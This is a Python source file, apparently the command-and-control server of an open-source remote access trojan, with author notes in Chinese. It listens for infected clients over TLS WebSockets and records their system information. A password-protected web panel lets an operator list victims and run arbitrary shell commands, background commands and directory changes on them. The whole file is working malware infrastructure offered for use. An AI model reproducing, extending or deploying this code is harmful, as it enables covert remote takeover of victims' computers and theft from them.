__author__ = "赵博凯"
__license__ = "GPL v3"

from quart import Quart, redirect, url_for, request, make_response, render_template, jsonify, websocket
import asyncio
import websockets
import hashlib
import ssl
import rich
import json
from sys import exit
import logging

import rich.traceback 

# 安装rich的回溯追踪，显示本地变量
rich.traceback.install(show_locals=True)

# --- 基础配置 ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
app = Quart(__name__)
HOST = '0.0.0.0' 
PORT = 8765
WEB_PORT = 5000  # Web界面端口
SSL_CERT = '../cert.pem' 
SSL_KEY = '../key.pem'
SECURITY_PATH = 'zhaobokai666'
SECURITY_PASSWORD_HASH = '29f81178a73ceec7fe10048875eb62368632ff51907d70d5f318bb48b62c8002' 

# --- 全局变量 ---
control_list = {}

# --- 服务器逻辑 ---
class Server:
    def __init__(self):
        pass
    
    def help(self):
        help_text = '''帮助信息：
[u bold yellow]help[/u bold yellow]：[green]显示帮助信息[/green]
[u bold yellow]about[/u bold yellow]：[green]显示关于信息[/green]
[u bold yellow]exit[/u bold yellow]：[green]退出程序[/green]
[u bold yellow]clear[/u bold yellow]：[green]清空终端屏幕[/green]
[u bold yellow]list[/u bold yellow]：[green]显示已连接的设备列表[/green]
[u bold yellow]select <id>[/u bold yellow]：[green]选择一个设备进行控制[/green]
[u bold yellow]delete <id>[/u bold yellow]：[green]删除已连接的设备[/green]'''  
        return help_text

    def about(self):
        about_text = '''关于：
作者：赵博凯
版权：Copyright © 赵博凯, All Rights Reserved.
此为开源软件，链接：[link=https://github.com/zhaobokai341/remote_access_trojan]https://github.com/zhaobokai341/remote_access_trojan[/link]
使用GPL v3协议，请自觉遵守协议。'''
        return about_text
    
    def client_list(self):
        if len(control_list) == 0:
            return "当前没有设备连接。"
        else:
            devices = []
            for device in control_list.items():
                devices.append({
                    'id': device[0],
                    'ip': device[1]['ip'],
                    'status': device[1]['status'],
                    'systeminfo': device[1]['systeminfo']
                })
            return devices
    
    async def delete(self, id):
        global control_list
        if id in control_list:
            websocket_ = control_list[id]['websocket']
            try:
                await websocket_.send("exit")
                control_list.pop(id)
                return f"成功删除ID为{id}的设备。"
            except Exception as e:
                control_list.pop(id)
                return f"断开设备ID为{id}的连接时发生异常: {e}"
        else:
            return f"设备ID为{id}的设备不存在。"

# --- 操纵目标设备逻辑 ---
class ControlClient:
    def __init__(self, id):
        self.id = id
        self.websocket = control_list[id]['websocket']

    def help(self):
        help_text = '''帮助信息：
[u bold yellow]help[/u bold yellow]：[green]显示帮助信息[/green]
[u bold yellow]about[/u bold yellow]：[green]显示关于信息[/green]
[u bold yellow]back[/u bold yellow]：[green]退出到上一级[/green]
[u bold yellow]clear[/u bold yellow]：[green]清空终端屏幕[/green]
[u bold yellow]list[/u bold yellow]：[green]显示已连接的设备列表[/green]
[u bold yellow]select <id>[/u bold yellow]：[green]选择一个设备进行控制[/green]
[u bold yellow]delete <id>[/u bold yellow]：[green]删除已连接的设备[/green]
[u bold yellow]command[/u bold yellow]：[green]进入command,可在对方下命令并返回结果[/green]
[u bold yellow]background <command>[/u bold yellow]：[green]在后台运行命令，不返回结果[/green]
[u bold yellow]cd <dir>[/u bold yellow]：[green]切换工作目录[/green]'''
        return help_text
    
    async def execute_command(self, command):
        await self.websocket.send(f"command:{command}")
        result = await self.websocket.recv()
        return result

    async def background(self, command):
        await self.websocket.send(f"background:{command}")
        await self.websocket.recv()
        return "命令已发送"

    async def change_directory(self, directory):
        await self.websocket.send(f"cd:{directory}")
        result = await self.websocket.recv()
        return result

# --- Quart 网页端逻辑和异步请求处理 ---

# --- 安全性检查 ---
def check():
    if "password" not in request.cookies:
        return False
    if request.cookies.get('password') == SECURITY_PASSWORD_HASH:
        return True
    else:
        return False

@app.route(f'/{SECURITY_PATH}/')
async def index():
    if not check():
        return redirect(url_for('login'))
    return await render_template('index.html')

@app.route(f'/{SECURITY_PATH}/login', methods=['GET', 'POST'])
async def login():
    if request.method == 'POST':
        form = await request.form
        password = form.get('password', '')
        if hashlib.sha256(password.encode()).hexdigest() == SECURITY_PASSWORD_HASH:
            resp = await make_response(redirect(url_for('index')))
            resp.set_cookie('password', SECURITY_PASSWORD_HASH)
            return resp
        return await render_template('login.html', error='密码错误')
    return await render_template('login.html')

@app.route(f'/{SECURITY_PATH}/api/logout')
async def logout():
    if not check():
        return jsonify({'error': '未授权'}), 401
    resp = await make_response(redirect(url_for('login')))
    resp.delete_cookie('password')
    return resp

@app.route(f'/{SECURITY_PATH}/api/devices')
async def get_devices():
    if not check():
        return jsonify({'error': '未授权'}), 401
    server = Server()
    return jsonify(server.client_list())

@app.route(f'/{SECURITY_PATH}/api/delete/<device_id>')
async def delete_device(device_id):
    if not check():
        return jsonify({'error': '未授权'}), 401
    server = Server()
    msg = await server.delete(device_id)
    return jsonify({'message': msg})

@app.route(f'/{SECURITY_PATH}/api/command', methods=['POST'])
async def execute_command():
    if not check():
        return jsonify({'error': '未授权'}), 401
    
    reqjson = await request.get_json()
    command = reqjson.get('command')
    device_id = reqjson.get('id')
    if not command:
        return jsonify({'error': '未提供命令'}), 400
    
    try:
        control_client = ControlClient(device_id)
        result = await control_client.execute_command(command)
        result = json.loads(result)
        return jsonify({'result': result["输出结果"] + result["输出结果（错误）"]})
    except Exception as e:
        return jsonify({'error': str(type(e))+str(e)}), 500

@app.route(f'/{SECURITY_PATH}/api/background', methods=['POST'])
async def background():
    if not check():
        return jsonify({'error': '未授权'}), 401

    reqjson = await request.get_json()
    command = reqjson.get('command')
    device_id = reqjson.get('id')
    if not command:
        return jsonify({'error': '未提供命令'}), 400

    try:
        control_client = ControlClient(device_id)
        result = await control_client.background(command)
        return jsonify({'message': result})
    except Exception as e:
        return jsonify({'error': str(type(e))+str(e)}), 500

@app.route(f'/{SECURITY_PATH}/api/cd', methods=['POST'])
async def cd():
    if not check():
        return jsonify({'error': '未授权'}), 401

    reqjson = await request.get_json()
    directory = reqjson.get('directory')
    device_id = reqjson.get('id')
    if not directory:
        return jsonify({'error': '未提供目录'}), 400

    try:
        control_client = ControlClient(device_id)
        result = await control_client.change_directory(directory)
        return jsonify({'message': result})
    except Exception as e:
        return jsonify({'error': str(type(e))+str(e)}), 500

@app.route(f'/{SECURITY_PATH}/device/<id>')
async def device(id):
    if not check():
        return redirect(url_for('login'))
    return await render_template('device.html', id=id)

# --- 被客户端连接处理逻辑 ---
# 使用 websockets, 不走quart websocket
async def handle_client(websocket):
    ip = websocket.remote_address[0] + ":" + str(websocket.remote_address[1])
    try:
        systeminfo = await websocket.recv()
    except Exception:
        systeminfo = "ERROR"
    
    control_list[str(websocket.id)] = {
        "ip": ip,
        "status": "connected",
        "websocket": websocket,
        "systeminfo": systeminfo
    }
    await websocket.wait_closed()

# --- 检查客户端连接状态 ---
async def check_clients_connection():
    global control_list
    while True:
        if len(control_list) > 0:
            for device in list(control_list.items()):
                try:
                    await device[1]['websocket'].ping()
                    control_list[device[0]]['status'] = "connected"
                except Exception as e:
                    control_list[device[0]]['status'] = "disconnected"
        await asyncio.sleep(10)

# --- 服务器启动逻辑 ---
async def server_loop():
    logging.info(f"正在配置证书文件, 证书位置: {SSL_CERT}, 密钥位置: {SSL_KEY}")
    try:
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_context.load_cert_chain(SSL_CERT, SSL_KEY)
    except FileNotFoundError:
        logging.error("证书文件或密钥文件不存在，请检查配置。")
        exit()

    logging.info(f"正在启动服务器, 监听地址: {HOST}, 端口: {PORT}")
    async with websockets.serve(handle_client, HOST, PORT, ssl=ssl_context):
        try:
            await asyncio.Event().wait()  # Await something cancellable on SIGINT
        except KeyboardInterrupt:
            exit()

async def main():
    logging.info("正在启动程序...")
    # 运行WebSocket服务器和连接检查
    await asyncio.gather(
        server_loop(),
        check_clients_connection(),
        app.run_task(host='0.0.0.0', port=WEB_PORT)
    )

if __name__ == '__main__':
    try:
        print("\033[H\033[J")
        logging.info("版权所有：Copyright © 赵博凯, All Rights Reserved.")
        asyncio.run(main())
    except KeyboardInterrupt:
        logging.warning("用户手动中断程序。")
        exit()
    except Exception as e:
        logging.error(f"错误: {e}，请报告到[link=https://github.com/zhaobokai341/remote_access_trojan/issues]Issues[/link]")